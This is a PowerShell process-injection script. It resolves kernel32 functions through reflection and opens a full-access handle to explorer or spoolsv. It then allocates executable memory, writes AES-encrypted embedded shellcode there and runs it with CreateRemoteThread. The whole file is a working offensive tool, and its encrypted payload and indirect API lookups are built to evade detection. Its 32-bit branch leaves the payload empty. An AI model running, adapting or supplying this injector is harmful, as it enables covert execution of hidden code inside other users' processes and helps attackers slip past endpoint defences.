# get script parameters
param (
    [Parameter(Mandatory = $false, Position = 0)]
    [String] $remoteProc
)

# function to get a pointer to a function in a module
function GetProcAddress($moduleName, $functionName) {
    $sysAssembly = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll'
    }

    $unsafeNativeMethods = ForEach ($type in $sysAssembly.GetTypes()) {
        $type | Where-Object {$_.FullName -like '*NativeMethods' -and $_.Fullname -like '*Win32*' -and $_.Fullname -like '*Un*'}
    }

    $moduleHandle = $unsafeNativeMethods.GetMethods() | Where-Object {$_.Name -like '*Handle' -and $_.Name -like '*Module*'} | Select-Object -First 1
    $procAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [type[]]('IntPtr', 'System.String'))

    $module = $moduleHandle.Invoke($null, @($moduleName))
    $procAddress.Invoke($null, @($module, $functionName))
}

function GetDelegateType($func, $delType = [Void]) {
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
    [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    return $type.CreateType()
}

# check if we are running elevated based on token integrity level
function IsElevated() {
    $windowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $windowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($windowsIdentity)
    $windowsPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# check if we are running on a 32-bit or 64-bit process
if ([IntPtr]::Size -eq 4) {
    $arch = 'x86'
    if (-not (IsElevated)) {
        Write-Warning '[!] You are not running this script as an administrator.'
    } else {
        Write-Host '[*] You are running this script as an administrator.'
    }
    Write-Host '[i] Injecting into process: ' (Get-Process -Id $PID).Name
    $remoteProcId = $PID
} elseif ([IntPtr]::Size -eq 8) {
    $arch = 'x64'
    if (-not ($remoteProc -eq '')) {
        if (-not (IsElevated)) {
            Write-Warning '[!] You are not running this script as an administrator.'
        } else {
            Write-Host '[*] You are running this script as an administrator.'
        }
        Write-Host '[i] Injecting into process: ' $remoteProc
    } else {
        if (-not (IsElevated)) {
            Write-Warning '[!] You are not running this script as an administrator.'
            $remoteProc = 'explorer'
            Write-Host '[i] Injecting into process: ' $remoteProc
        } else {
            Write-Host '[*] You are running this script as an administrator.'
            $remoteProc = 'spoolsv'
            Write-Host '[i] Injecting into process: ' $remoteProc
        }
    }
    # try to get process id of remote process
    try {
        $remoteProcId = (Get-Process -Name $remoteProc).Id[0]
    } catch {
        Write-Warning '[!] Unable to get process id of remote process.'
        Write-Warning -Message "[!] Last error: $($GetLastError.Invoke())"
        exit
    }
} else {
    Write-Warning '[!] Unable to determine current process architecture.'
    exit
}
Write-Host '[+] Current process architecture: ' $arch
Write-Host ''

$GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'GetLastError'), (GetDelegateType @() ([UInt32])))

# get handle to remote process
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'OpenProcess'), (GetDelegateType @([UInt32], [UInt32], [UInt32]) ([IntPtr])))
$remoteProcHandle = $OpenProcess.Invoke(0x001F0FFF, $false, $remoteProcId)

# confirm we have a handle to the remote process
if ($remoteProcHandle -eq 0) {
    Write-Warning '[!] Unable to get handle to remote process.'
    Write-Warning -Message "[!] Last error: $($GetLastError.Invoke())"
    exit
} else {
    Write-Host '[+] Got handle to remote process: ' $remoteProcHandle.ToString('X')
}
Write-Host ''

# allocate memory in remote process
Write-Host '[i] Allocating memory in remote process.'

$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'VirtualAllocEx'), (GetDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$remoteAlloc = $VirtualAllocEx.Invoke($remoteProcHandle, 0, 0x1000, 0x3000, 0x40)

# confirm we have a pointer to the allocated memory
if ($remoteAlloc -eq 0) {
    Write-Warning '[!] Unable to get pointer to allocated memory.'
    Write-Warning -Message "[!] Last error: $($GetLastError.Invoke())"
    exit
} else {
    Write-Host '[+] Got pointer to allocated memory: ' $remoteAlloc.ToString('X')
}

# buf to hold shellcode

# get current process architecture
if ($arch -eq 'x86') {

} else {
    #64
    $Key = [System.Convert]::FromBase64String("AYk2CqMZPjwkcuaYLyzWwHW5LwbogkrmNj0hSnlFGK8=")
    $IV = [System.Convert]::FromBase64String("386kdvJKW47pxPa55sRDYA==")
    $EncryptedBytes = [System.Convert]::FromBase64String("6cRNh6VYAiHYnaSjG8J9aODK8XXviJ3GKNCOWyHHJRy3dcmQuDWonNASFkyGXX/nz+9YeDmu0/hqmVZwy2mEqaCES/lRXx3TcVFTddWhRY/650nUuIVRMfSPla7Wxcteihn9k8EP9jNGorkqSIWDUDDX5fpN6j06ABpPuOLFXh60zCwsln2myl8EMUUeKZCZX+L0a20Wltv8vCwFxIF/cWmwMNV6bSkGGyPeGeiLB8NuC67EsCnqJaXQK3UAuqkZH+peG7o4a9cbF5NMZrIwsIHQlMoxCnYYiDnUjkFjrYiIllcOnf7xY0rlh2vwsWftE3k0kzSSicrQnuL5jXdy1IcBWQww5ajhLFt1tz/FA7gMG1xfPoleU3D8BsJ1zxjoe0Wo9RY/KS8S05DrUhgCb3/nKH1qH+IcHKss2OaXSbOUoKFS1M+3nS80S4164xr76NfC5wiACxqfkB8YT9GPkBtPeEHrMH0Tbb++Qdt1qUsvzMjlTGA/Baf6mE1zOF8kRByWg4F1GZ+iMalZoiyEgpeC4xW1MeIfj11NV2n6mdMOzcpPRFmeXRH2JFEvDHdwylhDrNgYsyMHyVvRqYNr6op46O3KX6v9h6sEFI71nLg+ZiGqZ70iIaDGbLjVGH5Lty3xhIfDAREFKsK58VXdLd1KMjBFI3oDnBavYB3AKlw=")

    $AesManaged = New-Object Security.Cryptography.AesManaged
    $AesManaged.Key = $Key
    $AesManaged.IV = $IV
    $AesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
    $AesManaged.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    $Decryptor = $AesManaged.CreateDecryptor($AesManaged.Key, $AesManaged.IV)

    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        
    [Byte[]] $buf = $DecryptedBytes
} 

# write shellcode to allocated memory
Write-Host '[i] Injecting shellcode into remote process memory.'

$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'WriteProcessMemory'), (GetDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$WriteProcessMemory.Invoke($remoteProcHandle, $remoteAlloc, $buf, $buf.Length, 0) | Out-Null

# confirm we wrote the shellcode to the allocated memory
if ($? -eq $false) {
    Write-Warning '[!] Unable to write shellcode to allocated memory.'
    Write-Warning -Message "[!] Last error: $($GetLastError.Invoke())"
    exit
} else {
    Write-Host '[+] Wrote shellcode to allocated memory.'
}
Write-Host ''

# create thread in remote process
Write-Host '[i] Creating thread in remote process.'

# check if we are injecting into a 32-bit process
if ($arch -eq 'x86') {
    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'CreateRemoteThread'), (GetDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
    $remoteThread = $CreateRemoteThread.Invoke($remoteProcHandle, 0, 0, $remoteAlloc, 0, 0, 0)
} else {
    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'kernel32.dll' 'CreateRemoteThread'), (GetDelegateType @([IntPtr], [IntPtr], [UInt64], [IntPtr], [IntPtr], [UInt64], [IntPtr]) ([IntPtr])))
    $remoteThread = $CreateRemoteThread.Invoke($remoteProcHandle, 0, 0, $remoteAlloc, 0, 0, 0)
}

# confirm we created a thread in the remote process
if ($remoteThread -eq 0) {
    Write-Warning '[!] Unable to create thread in remote process.'
    Write-Warning -Message "[!] Last error: $($GetLastError.Invoke())"
    exit
} else {
    Write-Host '[+] Created thread in remote process.'
}
